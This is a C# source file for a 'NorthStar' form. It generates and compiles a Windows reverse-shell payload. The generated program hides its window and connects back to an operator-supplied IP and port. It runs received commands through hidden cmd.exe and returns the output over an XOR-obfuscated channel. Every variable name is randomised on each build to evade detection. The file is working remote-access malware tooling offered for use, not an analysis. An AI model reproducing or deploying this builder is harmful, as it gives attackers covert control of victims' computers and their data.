using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NorthStar
{
    public partial class Payload : Form
    {

        private static string commandFunctionName;
        private static string socketVarName;
        private static string socketDeadVarName;
        private static string commandVar;
        private static string recVar;
        private static string bufVar;
        private static string isLastVar;
        private static string isFirstVar;
        private static string lasteVar;
        private static string byteVar;
        private static string sckVar;
        private static string sckFuncVar;
        private static string connectAddressVar;
        private static string obfunc;
        private static string msgbld;
        private static string emsgbld;
        private static string kstr;
        private static string ckl;
        private static string obfparam1;
        private static string obfparam2;
        private static string obfinfparam;
        private static string obfinfvar;
        private static string pvar;
        private static string exfivo;
        private static string exfive;
        private static Random random = new Random((int)DateTime.Now.Ticks);


        private string varGenerate(bool flag)
        {
            StringBuilder builder = new StringBuilder();
   
            char ch;
            if (flag)
            {
                for (int i = 0; i < 21; i++)
                {
                    ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                    builder.Append(ch);
                }

                return builder.ToString().ToUpper();
            }

            else
            {
                for (int i = 0; i <4; i++)
                {
                    ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                    builder.Append(ch);
                }

                return builder.ToString().ToUpper();

            }

        }

        private void genVars()
        {
            commandFunctionName = varGenerate(true);
            socketVarName = varGenerate(true);
            socketDeadVarName = varGenerate(true);
            commandVar = varGenerate(true);
            recVar = varGenerate(true);
            isFirstVar = varGenerate(true);
            lasteVar = varGenerate(true);
            byteVar = varGenerate(true);
            sckVar = varGenerate(true);
            sckFuncVar = varGenerate(true);
            connectAddressVar = varGenerate(true);
            isLastVar = varGenerate(true);
            bufVar = varGenerate(true);
            obfunc = varGenerate(true);
            msgbld = varGenerate(true);
            emsgbld = varGenerate(true);
            kstr = varGenerate(true);
            ckl = varGenerate(true);
            obfparam1 = varGenerate(true);
            obfparam2 = varGenerate(true);
            obfinfparam = varGenerate(true);
            obfinfvar = varGenerate(true);
            pvar = varGenerate(true);
            exfivo = varGenerate(true);
            exfive = varGenerate(true);
        }


        private string regeneratePayload()
        {
            string payload_1 = @"using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Client
{
    class Program
    {
        [DllImport(""Kernel32.dll"")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport(""user32.dll"")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);static Socket " + sckVar + @" = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);public static bool " + socketDeadVarName + @" = false;public static bool " + isFirstVar + @" = true;
        
 private static string " + obfunc + @"(string " + obfparam1 + @", string " + obfparam2 + @")
        {
            StringBuilder " + msgbld + @" = new StringBuilder(" + obfparam1 + @");
            StringBuilder " + kstr + @" = new StringBuilder(" + obfparam2 + @");
            int " + ckl + @" = 0;
            StringBuilder " + emsgbld + @" = new StringBuilder(" + obfparam1 + @".Length);

            char " + obfinfvar + @";
            for (int " + obfinfparam + @" = 0; " + obfinfparam + @" < " + obfparam1 + @".Length; " + obfinfparam + @"++)
            {
                " + obfinfvar + @" = " + msgbld + @"[" + obfinfparam + @"];

                " + obfinfvar + @" = (char)(" + obfinfvar + @" ^ " + kstr + @"[" + ckl + @"]);
                " + emsgbld + @".Append(" + obfinfvar + @");
                if (" + ckl + @" >= (" + obfparam2 + @".Length - 1))
                {
                    " + ckl + @" = 0;
                }

            }
            return " + emsgbld + @".ToString();
        }

        static void " + sckFuncVar + @"(){  if (!" + socketDeadVarName + @")" + socketDeadVarName + @" = false;IPEndPoint "+ connectAddressVar + @" = new IPEndPoint(IPAddress.Parse(""" +  textBoxListenerIp.Text + "\"" + ")," + " " + textBoxListenerPort.Text + ");";  // Server IP & PORT 
   
            string payload_2 = @"  " + sckVar + @".Connect(" + connectAddressVar + @");
        } public static bool " + commandFunctionName + @"()
        {
if (" + isFirstVar + @")
    {
                string " + isLastVar + @" = """ + textBoxInKey.Text + "\";";

            string payload_3 = @"
                " + isLastVar + @" = " + obfunc + @"("+ isLastVar + @",""" + textBoxEncrypt.Text + @""");

                byte[] " + lasteVar + @" = Encoding.Default.GetBytes(" + isLastVar + @");
                " + sckVar + @".Send(" + lasteVar + @", 0, " + lasteVar + @".Length, 0);
                " + isFirstVar + @" = false;
                return false;

            }
            else
            {
                if (!" + sckVar + @".Connected)
                    return false;
                byte[] " + bufVar + @" = new byte[255]; 
                int rec = " + sckVar + @".Receive(" + bufVar + @", 0, " + bufVar + @".Length, 0); // receving

                Array.Resize(ref " + bufVar + @", rec);
                string " + commandVar + @" = Encoding.Default.GetString(" + bufVar + @"); 
 " +commandVar + @" = " + obfunc + @"(" + commandVar + @",""" + textBoxEncrypt.Text + @""");

                    Process  " + pvar + @" = new Process();
                    " + pvar + @".StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    " + pvar + @".StartInfo.CreateNoWindow = true;
                    " + pvar + @".StartInfo.FileName = ""cmd.exe"";
                    " + pvar + @".StartInfo.Arguments = ""/C "" + " + commandVar + @";
                    " + pvar + @".StartInfo.RedirectStandardOutput = true;
                    " + pvar + @".StartInfo.RedirectStandardError = true;
                    " + pvar + @".StartInfo.UseShellExecute = false;
                    " + pvar + @".Start();
                    string " + exfivo + @" = " + pvar + @".StandardOutput.ReadToEnd();
                    string " + exfive + @" = " + pvar + @".StandardError.ReadToEnd();
                    string " + isLastVar + @" =" + exfivo + @" + ""\n"" + " + exfive + @";
" + isLastVar + @" = " + obfunc + @"(" + isLastVar + @",""" + textBoxEncrypt.Text + @""");
                    byte[] " + lasteVar + @" = Encoding.Default.GetBytes(" + isLastVar + @");
                    " + sckVar + @".Send(" + lasteVar + @", 0, " + lasteVar + @".Length, 0);
                
                return false;
            }

        }
        public static void Main(string[] args)
        {
           IntPtr hWnd = GetConsoleWindow();
           ShowWindow(hWnd, 0);

            while (true)
            {
                
                try
                {
                    " + sckFuncVar + @"();
                    while (" + socketDeadVarName + @" != true)
                    {

                        if (!" + sckVar + @".Connected)
                        {
                            " + socketDeadVarName + @" = true;
                          
                        }
                        " + socketDeadVarName + @" = " + commandFunctionName + @"();
                    }
                    " + sckVar + @".Close();
                }
                catch
                {

                    System.Threading.Thread.Sleep(5000); // Sleep time before reconnect
                    
                " + sckVar + @" = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    " + isFirstVar + @" = true;
                }

            }

        }
    }
}";




            return payload_1+payload_2+payload_3;
        }

      

        public Payload()
        {
            InitializeComponent();
        }

        private void buttonGeneratePayload_Click(object sender, EventArgs e)
        {
            genVars();
            bool isGeneratable = false;


            if (listenerCheckBox.Checked)
            {
                string temp = varGenerate(false);
                bool isNameChanged = false;
                bool isListenable = true;
                NorthStar.payloadName = textBoxExeName.Text;
                NorthStar.isPayloadNameUpdated = true;
                NorthStar.payloadConnectBackIP = textBoxListenerIp.Text;
                NorthStar.payloadConnectBackPort = textBoxListenerPort.Text;
                NorthStar.payloadConnectBackInitialKey = textBoxInKey.Text;
                NorthStar.portToListen = System.Convert.ToInt32(textBoxListenerPort.Text);


                if (NorthStar.listenerList.ContainsKey(NorthStar.payloadName) || NorthStar.payloadInitialKeyList.ContainsKey(NorthStar.payloadName) || NorthStar.payloadInitialKeyList.ContainsKey(NorthStar.payloadName))
                {
                    temp = varGenerate(false);
                    temp = textBoxPayload.Text + temp;
                    isNameChanged = true;
                }

                if (NorthStar.listenerList.ContainsValue(Convert.ToInt32(NorthStar.payloadConnectBackPort)))
                {
                    MessageBox.Show("Listener with same Port Exists !");
                    isListenable = false;
                    isGeneratable = false;
                }
            

                if (isNameChanged && isListenable)
                {


                    NorthStar.listenersNameList.Add(temp);
                    NorthStar.listenerList.Add(temp, NorthStar.payloadConnectBackPort);
                    NorthStar.listenerEncryptionKeyList.Add(temp, textBoxEncrypt.Text);

                    NorthStar.listenerAllowedList.Add(temp, true);
                    NorthStar.payloadInitialKeyList.Add(temp, NorthStar.payloadConnectBackInitialKey);
                    NorthStar.payloadListenerCheckBox = true;
                    isGeneratable = true;
                   
                    isListenable = false;


                }
                else if (!isNameChanged && isListenable)
                {
                    try
                    {
                        NorthStar.listenersNameList.Add(NorthStar.payloadName);
                        NorthStar.listenerList.Add(NorthStar.payloadName, NorthStar.payloadConnectBackPort);
                        NorthStar.listenerAllowedList.Add(NorthStar.payloadName, true);
                        NorthStar.listenerEncryptionKeyList.Add(NorthStar.payloadName, textBoxEncrypt.Text);

                        NorthStar.payloadInitialKeyList.Add(NorthStar.payloadName, NorthStar.payloadConnectBackInitialKey);
                        NorthStar.payloadListenerCheckBox = true;
                        isGeneratable = true;
                        isListenable = true;
                    }
                    catch
                    {
                        temp = varGenerate(false);
                        temp = textBoxPayload.Text + temp;
                        NorthStar.listenersNameList.Add(temp);
                        NorthStar.listenerList.Add(temp, NorthStar.payloadConnectBackPort);
                        NorthStar.listenerEncryptionKeyList.Add(temp, textBoxEncrypt.Text);

                        NorthStar.listenerAllowedList.Add(temp, true);
                        NorthStar.payloadInitialKeyList.Add(temp, NorthStar.payloadConnectBackInitialKey);
                        NorthStar.payloadListenerCheckBox = true;
                        isGeneratable = true;
                        isListenable = true;


                    }


                }


            }
            else
            {
                isGeneratable = true;

            }

            if (isGeneratable)
            {
                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
                ICodeCompiler icc = codeProvider.CreateCompiler();



                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
                string payload = regeneratePayload();
                parameters.GenerateInMemory = true;
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = path + "\\" + textBoxExeName.Text + ".exe";

                CompilerResults results = icc.CompileAssemblyFromSource(parameters, payload);
                if (results.Errors.Count < 1)
                {
                    textBoxPayload.Text = "Payload Created !";
                    isGeneratable = false;
                    NorthStar.isPayloadNameUpdated = true;


                }
                else
                {


                    foreach (CompilerError CompErr in results.Errors)
                    {
                        MessageBox.Show(CompErr.ErrorText.ToString());
                        MessageBox.Show(CompErr.ErrorNumber);

                    }
                }
            }
        }

        private void listenerCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            
        }

        private void textBoxExeName_TextChanged(object sender, EventArgs e)
        {
           
                if (System.Text.RegularExpressions.Regex.IsMatch(textBoxExeName.Text, "[^a-zA-Z]"))
                {
                    MessageBox.Show("Please enter only letters.");
                    textBoxExeName.Text = "";
                }
            
        }
    }
}
